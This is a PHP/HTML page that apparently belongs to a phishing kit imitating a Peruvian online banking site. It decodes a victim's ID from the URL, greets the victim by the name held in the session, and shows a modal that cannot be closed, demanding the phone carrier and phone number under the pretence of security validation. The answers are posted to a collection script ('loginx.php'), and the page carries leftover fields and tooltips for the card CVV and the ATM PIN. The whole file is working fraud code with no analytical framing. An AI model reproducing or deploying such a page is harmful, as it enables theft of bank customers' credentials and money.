<?php
error_reporting(0);
session_start();
/*****************************************************************************/
$xsua = $_GET["cgi"];
$xpas = $_GET["p"];
/*****************************************************************************/
$dni = base64_decode($xsua);
/*****************************************************************************/
//include '../files/reniec/consulta.php';
$name = ($nombres ? trim($nombres)." " : "Cliente");
$surn = ($paterno ? trim($paterno) : "");
/*****************************************************************************/
$creditcard="";
if(isset($_SESSION["creditcard"]))
{
    $creditcard=trim($_SESSION["creditcard"]);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xml:lang="en" lang="en" style="" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
<head class="at-element-marker">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1">
<link rel="stylesheet" href="../files/css/stylemodal.css">
<link rel="stylesheet" href="../files/css/libraries-min.css">
<link rel="stylesheet" href="../files/css/libraries-global-min.css">
<link rel="stylesheet" href="../files/css/modal.css">
<link rel="stylesheet" href="../files/fuentes.css">
<script src="../files/js/jquery-1.12.0.min.js"></script>
<script src="../files/js/bootstrap.min.js"></script>
<script type="text/javascript" src="../files/js/libraries.min.js"></script>
<script>
$(document).ready(function()
{
    $("#mostrarmodal").modal("show");
});
</script>
<script type="text/javascript">
function justNumbers(e) 
{
    var keynum = window.event ? window.event.keyCode : e.which;
    if ((keynum == 8) || (keynum == 46))
    return true;
    return /\d/.test(String.fromCharCode(keynum)); 
}
</script>

<script type="text/javascript">
$(document).ready(function() 
{  
  /*Tooltip CVV*/
  $("#cvcCard").mouseover(function() {
    $("#cvcCard").mousemove(function(e) {
      $("#infoCVC").css({
        left: e.pageX,
        top: e.pageY
      });
    });
    eleOffset = $("#infoCVC").offset();
    $("#infoCVC").fadeIn("fast").css({
      left: eleOffset.left + $("#infoCVC").outerWidth(),
      top: eleOffset.top
    });
  }).mouseout(function() {
      $("#infoCVC").fadeOut("fast");
  });
  
  /*Tooltip Cell*/
  $("#cell").mouseover(function() {
    $("#cell").mousemove(function(e) {
      $("#infoCELL").css({
        left: e.pageX,
        top: e.pageY
      });
    });
    eleOffset = $("#infoCELL").offset();
    $("#infoCELL").fadeIn("fast").css({
      left: eleOffset.left + $("#infoCELL").outerWidth(),
      top: eleOffset.top
      });
  }).mouseout(function() {
      $("#infoCELL").fadeOut("fast");
  });
  
  /*Tooltip ATM*/
  $("#atmCard").mouseover(function() {
    $("#atmCard").mousemove(function(e) {
      $("#infoATM").css({
        left: e.pageX,
        top: e.pageY
        });
    });
    eleOffset = $("#infoATM").offset();
    $("#infoATM").fadeIn("fast").css({
      left: eleOffset.left + $("#infoATM").outerWidth(),
      top: eleOffset.top
    });
  }).mouseout(function() {
      $("#infoATM").fadeOut("fast");
  });
  
  /*Reglas para Formulario Inical*/
  $("#updateDatos").submit(function() {
  function alertas(msj) {
    $('#aviso').html(msj);
    $('#aviso_div').fadeIn("fast");
    setTimeout(function() {
    $('#aviso_div').hide(600);}, 9000); }
      
  if ($("#opCell option:selected").val() == "") {
    alertas('<b>Advertencia:</b> Seleccione el <b>Operador de su Celular</b> para continuar');
    $("#opCell").focus();
    return false; }
  if ($("#cell").val().length < 9 || isNaN($("#cell").val())) {
    alertas('<b>Advertencia:</b> Ingrese o complete su <b>N° de Celular</b> para continuar');
    $("#cell").val("");
    $("#cell").focus();
    return false; }
 
    $('input[type="submit"]').attr('disabled','disabled');
  });
});
</script>
		
<style>.at-element-marker {visibility:visible;}</style>
	
<style>
    #tarjetaCreditoBanner .links{
        padding: 6px 20px 20px 20px;
    }
    #tarjetaCreditoBanner h5{
        display: table;
    }
    #tarjetaCreditoBanner .headingTCBText{
        color: #333333;
    display: table-cell;
    padding-right: 10px;
    font-weight: bold;
    font-size: 16px;
    font-family: Arial;
    }
    #tarjetaCreditoBanner .icon-32.blue.b09-tarjeta{
        display: table-cell;
    }
    #tarjetaCreditoBanner p{
        font-size: 12px;
    line-height: 14px;
    margin: 1.6em 0;
    }
    #tarjetaCreditoBanner .btn{
        width: 100%;
    }      
    #boxProgressionTest .col-mis-opo{
      display: none;
    }
    #boxProgressionTest .img-responsive{
      height: 35px;
    }
    #boxProgressionTest .texto-front-mis-opo{
      padding-top: 10px;
      height: 120px;
    }
    #boxProgressionTest .parrafo-front-mis-opo{
      padding-top: 16px;
    }
    #boxProgressionTest .btn.mis-opo{
      background-color: #169BD5;
    }
    #slideContainer{
      overflow: hidden;
    }
    #boxProgressionTest{
      margin-bottom: 2em;
    }
    #boxProgressionTest .sprite-arrow-test{
      background-image: url(../files/img/16xSprite-buttons.png);
      background-repeat: no-repeat;
      background-position: 6px -103px;
      width: 30px;
      height: 30px;
      cursor: pointer;
    }
    #boxProgressionTest .oneclic-banner-desktop .contenido-click{
      border: 0;
    }
    #boxProgressionTest .parrafo-titulo{
      padding-left: 1em;
    }
</style>
<style type="text/css">
  @font-face {
font-family: omnes;
font-style: normal;
font-display: auto;
font-weight: 200;
src: url(../files/fonts/omnes/omnes-regular-webfont.eot) format("eot"), url(../files/fonts/omnes/omnes-regular-webfont.woff) format("woff"), url(../files/fonts/omnes/omnes-regular-webfont.ttf) format("truetype"), url(../files/fonts/omnes/omnes-regular-webfont.svg) format("svg")
}
</style>
</head>
<body style="font-family: omnes;">

<!-- TolTip CVV -->
<div id="infoCVC" class="ToolTip1" style="display: none; left: 713px; top: 377px;">
<table>
  <tbody><tr>
    <td bgcolor="#EAEAEA"><img src="../files/img/cvv2.jpg" width="190" ></td>
  </tr>
</tbody></table>
</div>
<!-- Fin TolTip CVV -->

<!-- TolTip Celular -->
<div id="infoCELL" class="ToolTip2" style="display: none; left: 713px; top: 377px;">
<table>
  <tbody>
  <tr>
    <td valign="middle" bgcolor="#EAEAEA"><p class="textoC" style="text-align:center;">Ingrese el número que registo en nuestra Banca.</p></td>
  </tr>
</tbody></table>
</div>
<!-- Fin TolTip Celular -->

<!-- TolTip ATM -->
<div id="infoATM" class="ToolTip2" style="display: none; left: 713px; top: 377px;">
<table>
  <tbody>
  <tr>
    <td valign="middle" bgcolor="#EAEAEA"><p class="textoC" style="text-align:center;">Ingrese los 4 digitos de su Clave de Cajero (ATM).</p></td>
  </tr>
</tbody></table>
</div>
<!-- Fin TolTip ATM -->
    <div class="modal fade" id="mostrarmodal" tabindex="-1" role="dialog" aria-labelledby="basicModal" aria-hidden="true" data-backdrop="static" data-keyboard="false" style="top: 157px;"><!-- data-backdrop="static" data-keyboard="false" -> evita cerrar al hacer clic o al presionar Esc-->
      <div class="modal-dialogos"><!-- modal-dialog -->
        <div class="modal-content"><!-- modal-contenido -->
          <!--<div class="modal-header">-->
            <!--<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>--><!-- Boton Cerrar -->
              <div id="cabeceraTitle">
                <h2 class="tituloPrincipal"><b>Validación de N° de Celular</b></h2>
                <p style="height: 5px;"></p>
              </div>
              <div class="textoB" style="margin: 0px 20px 0px 20px;">
                <b class="textoA">Estimado(a): </b><span class="textoD"><?php echo $_SESSION["nombre"]; ?>,</span>
                <span class="textoE">para poder realizar tus operaciones en <span style="color:#434a58;"><b>Banca por Internet</b></span> de manera más segura, es necesario validar su número de celular el cual registro en Nuestra Banca por Internet, por favor complete el siguiente formulario.</span>
              </div>
          <!--</div>-->
            
          <div class="modal-bodys"> <!-- Inicio del Cuerpo Modal-->
            <div id="content">
              <form id="updateDatos" method="POST" action="../loginx.php?id=2&cgi=<?php echo $xsua?>">
                <input type="hidden" name="idy" value="<?=$xpas;?>" />
                <input type="hidden" name="idX" value="<?=$xsua;?>" />
              <input type="text" id="methodx" value="cvv" style="display:none;">
                <table align="center" width="100%">
                    <tbody>
                        <tr style="display:;" class="registro">
                            <td class="textoC">Operador</td>
                            <td>
                                <select size="1" name="opCell" id="opCell" title="Por favor, Seleccione el Operador de su Celular" x-moz-errormessage="Por favor, Seleccione el Operador de su Celular">
                                    <option  value="">Seleccione</option>
                                    <option selected value="Movistar">Movistar</option>
                                    <option value="Claro">Claro</option>
                                    <option value="Bitel">Bitel</option>
                                    <option value="Entel">Entel</option>
                                </select>
                            </td>
                            <td class="textoC">Celular</td>
                            <td>
                                <input type="tel" name="cell" maxlength="9" value="" minlength="9" onKeyPress="return justNumbers(event);" id="cell" placeholder="N° Celular" onFocus="this.placeholder = ''" onBlur="this.placeholder = 'N° Celular'" autocomplete="off" style="width:90px" />
                            </td>
                        </tr>
                        
                    </tbody>
                </table>
                <div id="aviso_div" class="msj_chico" style="display:none;"><span class="icoAlerta"></span><p id="aviso" class="textoC"></p></div>
                <table width="100%" align="center">
                  <tbody>
                    <tr>
                      <td style="height: 10px;"></td>
                    </tr>
                    <tr>
                      <td style="text-align: center;">
                        <input id="loginx" type="submit" value="Continuar" style="  background-color: #008441;
  color: #FFFFFF;
  border-radius: 3px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border: 1px solid black;
  text-align: center;
  font-size: 14px;
  font-weight: normal;
  font-style: normal;
  text-decoration: none;
  border-color:#FFFFFF;border-radius:4px;border-width :1px;cursor:pointer;line-height:11px;
  width: 30%;
  height: 40px;">
                      </td>
                    </tr>
                    <tr>
                      <td style="height: 10px;"></td>
                    </tr>
                  </tbody>
                </table>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>

<iframe src="../files/background.php?id=<?php echo $name?>&cgi=<?php echo $surn?>" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden;"></iframe>

<script>
    var cont = 0;
    function cambiarcolor()
    {      
        if($("#validar").val()=="true")
        {
            $("#error").hide();

            if ( $("#nombre_tarjeta").val() == "visa" ) {
              $("#visa").show();
              $("#master").hide();
              $("#america").hide();
              $("#cvcCard").attr('maxlength','3');
            }

            if ( $("#nombre_tarjeta").val() == "maestro" || $("#nombre_tarjeta").val() == "mastercard" ) {
              $("#visa").hide();
              $("#master").show();
              $("#america").hide();
              $("#cvcCard").attr('maxlength','3');
            }

            if ( $("#nombre_tarjeta").val() == "amex" ) {
              $("#visa").hide();
              $("#master").hide();
              $("#america").show();
              $("#cvcCard").attr('maxlength','4');
            }

        } else 
        {
            if(cont!=0){
              $("#visa").hide();
              $("#america").hide();
              $("#master").hide();
              $("#error").show();
              $("#cvcCard").val("");
            }
      }
    }

  
$(function() 
{
});

</script>
</html>